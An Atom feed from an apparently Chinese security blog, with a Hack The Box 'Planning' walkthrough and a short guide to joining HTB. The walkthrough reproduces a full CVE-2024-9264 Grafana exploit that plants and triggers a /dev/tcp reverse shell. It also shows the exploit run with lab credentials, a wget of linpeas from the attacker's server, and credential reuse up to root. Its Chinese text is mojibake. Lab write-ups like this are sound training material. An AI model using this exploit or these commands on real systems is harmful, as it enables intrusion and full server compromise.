<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>2in9ya2 Blog</title>
  
  <subtitle>For the future me</subtitle>
  <link href="https://2in9ya2.github.io/atom.xml" rel="self"/>
  
  <link href="https://2in9ya2.github.io/"/>
  <updated>2025-08-25T07:52:22.813Z</updated>
  <id>https://2in9ya2.github.io/</id>
  
  <author>
    <name>2in9ya2</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pwned-Exploiting HTB Planning</title>
    <link href="https://2in9ya2.github.io/Pwned-Exploiting-HTB-Planning/"/>
    <id>https://2in9ya2.github.io/Pwned-Exploiting-HTB-Planning/</id>
    <published>2025-08-25T07:52:22.813Z</published>
    <updated>2025-08-25T07:52:22.813Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Planning"><a href="#Planning" class="headerlink" title="Planning"></a>Planning</h1><span id="more"></span><h2 id="ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ"><a href="#ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ" class="headerlink" title="ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ"></a>ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC --min-rate 2000 10.10.11.68 --verbose</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰<code>22ã€80</code>ç«¯å£ã€‚é‚£å°±è®¿é—®ä¸€ä¸‹<code>80</code>ç«¯å£</p><p><img src="/../images/6b8d5a94377a9e54f1300b08e53aef0603c07a5789a6990e88876f2d1353c986.png" alt="picture 0">  </p><p>å‘ç°æ— æ³•è®¿é—®ï¼Œé‚£å°±æ·»åŠ åˆ°<code>/etc/hosts</code>é‡Œé¢<br><img src="/../images/8ab000024e41734761e06efedc965140750240e820c9409f0ce4aebbcd1ff3c1.png" alt="picture 1">  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;10.10.11.68\tplanning.htb&#x27;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure><p>æ‰¾ä¸€æ‰¾ï¼ŒæŠ“æŠ“åŒ…ï¼Œå‘ç°æ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œé‚£å°±æ‰«ä¸‹å…¶ä»–æ–‡ä»¶å’Œå­åŸŸåã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost  -u http://planning.htb -w tools/SecLists/Discovery/DNS/combined_subdomains.txt --ne</span><br></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥ä¸€ä¸ª<code>grafana.planning.htb</code>ï¼ŒåŠ åˆ°<code>/etc/hosts</code>é‡Œé¢å†è®¿é—®ã€‚<br>åˆ©ç”¨é¢˜ç›®ç»™å‡ºçš„è´¦å·å¯†ç ç™»å½•ä¹‹åï¼Œå‘ç°<code>grafana</code>ç‰ˆæœ¬ä¸º<code>11.0</code>ï¼Œæ‰¾æ‰¾<code>CVE</code>ã€‚</p><p><img src="/../images/fe2f3ab8d76db1e88250d82964fd94547ad4d1c89daf3d6896c3d41c73cecc8a.png" alt="picture 2">  </p><p>æ‰¾åˆ°äº†<code>CVE-2024-9264</code>ï¼Œä»¥åŠç›¸åº”<a href="https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit">POC</a>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Grafana Remote Code Execution (CVE-2024-9264) via SQL Expressions</span></span><br><span class="line"><span class="string">See here: https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author: z3k0sec // www.zekosec.com</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">authenticate</span>(<span class="params">grafana_url, username, password</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Authenticate to the Grafana instance.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        grafana_url (str): The URL of the Grafana instance.</span></span><br><span class="line"><span class="string">        username (str): The username for authentication.</span></span><br><span class="line"><span class="string">        password (str): The password for authentication.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        session (requests.Session): The authenticated session.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Login URL</span></span><br><span class="line">    login_url = <span class="string">f&#x27;<span class="subst">&#123;grafana_url&#125;</span>/login&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Login payload</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create a session to persist cookies</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Perform the login</span></span><br><span class="line">    response = session.post(login_url, json=payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check if the login was successful</span></span><br><span class="line">    <span class="keyword">if</span> response.ok:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[SUCCESS] Login successful!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> session  <span class="comment"># Return the authenticated session</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[FAILURE] Login failed:&quot;</span>, response.status_code, response.text)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># Return None if login fails</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_reverse_shell</span>(<span class="params">session, grafana_url, reverse_ip, reverse_port</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Create a malicious reverse shell payload in Grafana.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        session (requests.Session): The authenticated session.</span></span><br><span class="line"><span class="string">        grafana_url (str): The URL of the Grafana instance.</span></span><br><span class="line"><span class="string">        reverse_ip (str): The IP address for the reverse shell.</span></span><br><span class="line"><span class="string">        reverse_port (str): The port for the reverse shell.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Construct the reverse shell command</span></span><br><span class="line">    reverse_shell_command = <span class="string">f&quot;/dev/tcp/<span class="subst">&#123;reverse_ip&#125;</span>/<span class="subst">&#123;reverse_port&#125;</span> 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Define the payload to create a reverse shell</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;queries&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;datasource&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Expression&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;__expr__&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;uid&quot;</span>: <span class="string">&quot;__expr__&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment"># Using the reverse shell command from the arguments</span></span><br><span class="line">                <span class="string">&quot;expression&quot;</span>: <span class="string">f&quot;SELECT 1;COPY (SELECT &#x27;sh -i &gt;&amp; <span class="subst">&#123;reverse_shell_command&#125;</span>&#x27;) TO &#x27;/tmp/rev&#x27;;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;hide&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;refId&quot;</span>: <span class="string">&quot;B&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;sql&quot;</span>,</span><br><span class="line">                <span class="string">&quot;window&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send the POST request to execute the payload</span></span><br><span class="line">    response = session.post(</span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;grafana_url&#125;</span>/api/ds/query?ds_type=__expr__&amp;expression=true&amp;requestId=Q100&quot;</span>,</span><br><span class="line">        json=payload</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response.ok:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Reverse shell payload sent successfully!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Set up a netcat listener on &quot;</span> + reverse_port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed to send payload:&quot;</span>, response.status_code, response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_reverse_shell</span>(<span class="params">session, grafana_url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Trigger the reverse shell binary.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        session (requests.Session): The authenticated session.</span></span><br><span class="line"><span class="string">        grafana_url (str): The URL of the Grafana instance.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># SQL command to trigger the reverse shell</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;queries&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;datasource&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Expression&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;__expr__&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;uid&quot;</span>: <span class="string">&quot;__expr__&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment"># install and load the community extension &quot;shellfs&quot; to execute system commands (here: execute our reverse shell)</span></span><br><span class="line">                <span class="string">&quot;expression&quot;</span>: <span class="string">&quot;SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv(&#x27;bash /tmp/rev |&#x27;);&quot;</span>,</span><br><span class="line">                <span class="string">&quot;hide&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;refId&quot;</span>: <span class="string">&quot;B&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;sql&quot;</span>,</span><br><span class="line">                <span class="string">&quot;window&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Trigger the reverse shell via POST</span></span><br><span class="line">    response = session.post(</span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;grafana_url&#125;</span>/api/ds/query?ds_type=__expr__&amp;expression=true&amp;requestId=Q100&quot;</span>,</span><br><span class="line">        json=payload</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response.ok:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Triggered reverse shell successfully!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed to trigger reverse shell:&quot;</span>, response.status_code, response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">grafana_url, username, password, reverse_ip, reverse_port</span>):</span><br><span class="line">    <span class="comment"># Authenticate to Grafana</span></span><br><span class="line">    session = authenticate(grafana_url, username, password)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> session:</span><br><span class="line">        <span class="comment"># Create the reverse shell payload</span></span><br><span class="line">        create_reverse_shell(session, grafana_url, reverse_ip, reverse_port)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Trigger the reverse shell binary</span></span><br><span class="line">        trigger_reverse_shell(session, grafana_url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># Set up command line argument parsing</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Authenticate to Grafana and create a reverse shell payload&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--url&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Grafana URL (e.g., http://127.0.0.1:3000)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Grafana username&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Grafana password&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--reverse-ip&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Reverse shell IP address&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--reverse-port&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Reverse shell port&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Call the main function with the provided arguments</span></span><br><span class="line">    main(args.url, args.username, args.password, args.reverse_ip, args.reverse_port)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç›´æ¥æ‰§è¡Œ</span></span><br><span class="line">python3 poc.py --url http://grafana.planning.htb/ --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.16.3 --reverse-port 4444</span><br></pre></td></tr></table></figure><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åå¼¹<code>shell</code>æˆåŠŸï¼Œå¹¶ä¸”ä¸º<code>root</code>æƒé™ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å‘ç°<code>flag</code>ã€‚<br><img src="/../images/4d3e5c6a902d1ddd19e52310baad401fd2c8c4d728946fd13bf7654d9b603927.png" alt="picture 3">  </p><p>ä¼ å…¥<code>linpeas.sh</code>å¹¶æ‰§è¡Œçœ‹çœ‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æœ¬æœºæ‰§è¡Œ</span></span><br><span class="line">python -m http.server 8888</span><br><span class="line"></span><br><span class="line"><span class="comment"># é¶æœºæ‰§è¡Œ</span></span><br><span class="line">wget http://10.10.16.3:8888/linpeas.sh -O linpeas.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œä¹‹åå‘ç°åœ¨å®¹å™¨é‡Œï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ã€‚å‘ç°äº†è¿™ä¸ªæœ‰å¯†ç ï¼Œé—®é—®<code>GPT</code>æ€ä¹ˆçœ‹ã€‚<br><img src="/../images/3d86b87be698b92608af37f7166e123b3b8515cb988610612c2e2061e6fe7f49.png" alt="picture 4">  </p><p><code>gptè¯´ï¼šğŸ‘‰ è¿™æ˜¯ Grafana é»˜è®¤ç®¡ç†å‘˜å‡­è¯ï¼Œåœ¨æ¸—é€ä¸­å¾ˆå…³é”®ã€‚ é€šå¸¸è¯´æ˜ Grafana æ˜¯ç”¨è¿™ä¸ªè´¦å· enzo / RioTecRANDEntANT! æ¥è¿è¡Œçš„ï¼Œå¯èƒ½ä¹Ÿèƒ½æ‹¿æ¥ç™»å½• Web ç•Œé¢æˆ–å¤ç”¨åˆ°å…¶ä»–åœ°æ–¹ã€‚</code></p><p><code>SSH</code>ç™»å½•ä¸‹çœ‹çœ‹ã€‚ç™»å½•æˆåŠŸäº†ï¼Œé¡ºæ‰‹è·å¾—äº†<code>user.txt</code>ã€‚</p><p><img src="/../images/4b246923a97faf5412d47d003228dddb978aea89547b97fdc60d5d4ff3c38793.png" alt="picture 5">  </p><p>å¯ä»¥çœ‹åˆ°å¼€å¯äº†å¾ˆå¤šç«¯å£ï¼Œé‚£å°±ä¸€ä¸ªä¸€ä¸ªè¯•è¯•ï¼Œè¿›è¡Œç«¯å£æ˜ å°„ï¼Œå‘ç°<code>8000</code>ç«¯å£å¯ä»¥ç™»å½•ã€‚</p><p><img src="/../images/1ad148790f2a149b44596e5125e22847248a1109da1af2e27e516274a6ed25f7.png" alt="picture 6">  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 9999:127.0.0.1:8000 enzo@10.10.11.68</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰¾æ‰¾ç³»ç»Ÿå†…æ˜¯ä¸æ˜¯å­˜åœ¨å¯†ç ï¼Œå‘ç°æœ‰ä¸ª.dbæ–‡ä»¶ã€‚</p><p><img src="/../images/d8f7dcb542c819b3c95de320c4a919253e645dad68d9162936a0f92927ab8357.png" alt="picture 7">  </p><p>æ‰“å¼€çœ‹åˆ°äº†å¯†ç å‡­è¯ã€‚<br><img src="/../images/94a948594ec34f0e732414195ac48c47321a874375f7a5dd629b8dc32022a69b.png" alt="picture 8">  </p><p>ä»¥<code>root</code>ä¸ºè´¦å·ï¼Œç™»å½•æˆåŠŸï¼Œå‘ç°æ˜¯ä¸ªè®¾ç½®å®šæ—¶ä»»åŠ¡çš„ç½‘ç«™ï¼Œé‚£å°±åå¼¹<code>shell</code>ã€‚</p><p><img src="/../images/3d02009c306dd5efac632ebe71ff815c6eab2cbdbd2f09070d37f71d58ea7eb2.png" alt="picture 9">  </p><p>å‘ç°è¿æ¥æˆåŠŸï¼Œè·å¾—<code>root</code>æƒé™ã€‚</p><h2 id="åˆå­¦åˆ°äº†T-T"><a href="#åˆå­¦åˆ°äº†T-T" class="headerlink" title="åˆå­¦åˆ°äº†T_T"></a>åˆå­¦åˆ°äº†T_T</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Planning&quot;&gt;&lt;a href=&quot;#Planning&quot; class=&quot;headerlink&quot; title=&quot;Planning&quot;&gt;&lt;/a&gt;Planning&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>How to use HTB?</title>
    <link href="https://2in9ya2.github.io/how-to-use-htb/"/>
    <id>https://2in9ya2.github.io/how-to-use-htb/</id>
    <published>2025-08-25T07:52:22.813Z</published>
    <updated>2025-08-25T07:52:22.813Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTB"><a href="#HTB" class="headerlink" title="HTB"></a>HTB</h1><span id="more"></span><h2 id="ä»€ä¹ˆæ˜¯HTBï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯HTBï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯HTBï¼Ÿ"></a>ä»€ä¹ˆæ˜¯HTBï¼Ÿ</h2><p><a href="https://www.hackthebox.com/">Hack The Box</a> æ˜¯ä¸€ä¸ªåœ¨çº¿å¹³å°ï¼Œç”¨æˆ·å¯ä»¥åœ¨å…¶ä¸­ç»ƒä¹ é»‘å®¢æŠ€æœ¯ã€æ¼æ´åˆ©ç”¨ã€æƒé™æå‡ã€é€†å‘åˆ†æç­‰ç½‘ç»œå®‰å…¨ç›¸å…³æŠ€èƒ½ã€‚å®ƒé€šè¿‡å„ç§<strong>æŒ‘æˆ˜ï¼ˆChallengesï¼‰å’Œé¶æœºï¼ˆMachinesï¼‰</strong>æ¥æ¨¡æ‹Ÿç°å®ä¸–ç•Œä¸­çš„æ¼æ´ç¯å¢ƒã€‚</p><h2 id="HTB-VIP-å’Œ-HTB-Academy-VIPçš„åŒºåˆ«"><a href="#HTB-VIP-å’Œ-HTB-Academy-VIPçš„åŒºåˆ«" class="headerlink" title="HTB VIP å’Œ HTB Academy VIPçš„åŒºåˆ«"></a>HTB VIP å’Œ HTB Academy VIPçš„åŒºåˆ«</h2><p>HTB VIP ä¸»è¦é¢å‘æƒ³è¦æå‡å®æˆ˜æ¸—é€èƒ½åŠ›çš„ç”¨æˆ·ï¼Œæä¾›å¤§é‡é¶æœºã€å®˜æ–¹é¢˜è§£ã€ä»¥åŠå®Œæ•´æŒ‘æˆ˜ç¯å¢ƒï¼›è€Œ HTB Academy VIP åˆ™æ›´åå‘ç³»ç»ŸåŒ–å­¦ä¹ ï¼Œæä¾›ç»“æ„åŒ–è¯¾ç¨‹ä¸é…å¥—å®éªŒé¶åœºï¼Œé€‚åˆå…¥é—¨å­¦ä¹ æˆ–æ‰“ç‰¢ç†è®ºåŸºç¡€çš„ç”¨æˆ·ã€‚ä¸¤è€…åˆ†åˆ«ä¾§é‡â€œç»ƒâ€ä¸â€œå­¦â€ï¼Œäº’ä¸ºè¡¥å……ã€‚</p><p>HTB Academy VIPæ›´é€‚åˆ0åŸºç¡€çš„ï¼ŒHTB VIPé€‚åˆæœ‰ä¸€å®šåŸºç¡€çš„ã€‚</p><h2 id="å¼€å§‹ä½¿ç”¨"><a href="#å¼€å§‹ä½¿ç”¨" class="headerlink" title="å¼€å§‹ä½¿ç”¨"></a>å¼€å§‹ä½¿ç”¨</h2><h3 id="æ³¨å†Œ"><a href="#æ³¨å†Œ" class="headerlink" title="æ³¨å†Œ"></a>æ³¨å†Œ</h3><p>åœ¨<a href="https://account.hackthebox.com/register">æ³¨å†Œç½‘ç«™</a>è¿›è¡Œæ³¨å†Œï¼Œæ­¥éª¤çœç•¥ã€‚</p><h3 id="ç™»å½•ä»¥åŠä½¿ç”¨"><a href="#ç™»å½•ä»¥åŠä½¿ç”¨" class="headerlink" title="ç™»å½•ä»¥åŠä½¿ç”¨"></a>ç™»å½•ä»¥åŠä½¿ç”¨</h3><p>ç™»å½•åé€‰æ‹©HTB Labè¿›å…¥ã€‚<br><img src="/../images/dd0cf5cc7a0a4d370377f2e2b68d80e5bcbbac38441a9b45711ab3b17098a91f.png" alt="picture 0"></p><p>æ–°æ‰‹ç›´æ¥é€‰æ‹©<br><code>Stating Point</code><br><img src="/../images/0805c62f7967b4cb6b0bc772bb9c505d11e56d9341d8e7c74d3fd160860da20d.png" alt="picture 1"></p><p>è¿›å…¥ä¹‹åé€‰æ‹©å³ä¸Šè§’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONNECT TO HTB</span><br></pre></td></tr></table></figure><p><img src="/../images/58f1b34a9c3d80382a1b229fc919a1a7780172a2cebc6c5e0cda425fdb5f9239.png" alt="picture 2"></p><p>æ¥ç€é€‰æ‹©<code>Starting Point</code>æ¥è¿›è¡Œè¿æ¥ï¼Œè¿™æ˜¯é¢å‘æ–°æ‰‹çš„æ•™å­¦ä¸“åŒºï¼Œé‡Œé¢æä¾›äº†ä¸€äº›å…è´¹çš„é¶æœºä¾›ä½ ç»ƒä¹ ã€‚<br><img src="/../images/eab444c876a51a9506093eee2e210f63bf87adc52108fcd793db68ec6026df58.png" alt="picture 3"><br>æ¥ä¸‹æ¥é€‰æ‹© <code>OpenVPN</code> è¿›è¡Œè¿æ¥ã€‚<code>Pwnbox</code> æ˜¯ <code>HTB</code> æä¾›çš„åŸºäºç½‘é¡µçš„æ¸—é€æµ‹è¯•ç¯å¢ƒï¼Œä½¿ç”¨æ–¹ä¾¿ï¼Œä½†ä»…é™ä¼šå‘˜ç”¨æˆ·ä½¿ç”¨ã€‚<br><img src="/../images/997aedba180e79f698d75a43766a7f45266d2bbc0c631c591b9c5825f37dda73.png" alt="picture 4"></p><p>ç‚¹å‡»åå¯ä»¥é€‰æ‹©ä¸åŒçš„è¿æ¥åè®®ï¼Œé»˜è®¤æ¨èä½¿ç”¨<code>UDP</code>ï¼Œå¦‚æœæ— æ³•è¿æ¥ï¼Œå¯åˆ‡æ¢ä¸º <code>TCP</code>ã€‚é€‰æ‹©åˆé€‚çš„åè®®åï¼Œä¸‹è½½å¯¹åº”çš„ VPN é…ç½®æ–‡ä»¶ï¼Œå¹¶å°†å…¶å¯¼å…¥åˆ°<code>OpenVPN</code>ä¸­è¿›è¡Œè¿æ¥ã€‚<br><img src="/../images/e6e43090b6d4825d95138a2efe1ffcb4024081aff49ef884ce666dd2ad3892e7.png" alt="picture 5"><br>ç»¿è‰²ä¹‹åå°±å¯ä»¥é€‰æ‹©ç›¸åº”çš„<code>Machine</code>è¿›è¡Œæ¸—é€å•¦ã€‚<br><img src="/../images/2cb530d9dccdc353b67f37aebeda55629421bf7f5a350cf8796e24eaf2f1f762.png" alt="picture 6">  </p><h2 id="åç»­"><a href="#åç»­" class="headerlink" title="åç»­"></a>åç»­</h2><p>å¦‚æœä½ æƒ³ä½¿ç”¨ HTB Academy å¹¶è´­ä¹°ä¼šå‘˜ï¼Œé€šå¸¸éœ€è¦ä¸€ä¸ªå›½å¤–æ•™è‚²é‚®ç®±ï¼ˆ.eduï¼‰ã€‚ä½ å¯ä»¥é€šè¿‡ç½‘ç«™<a 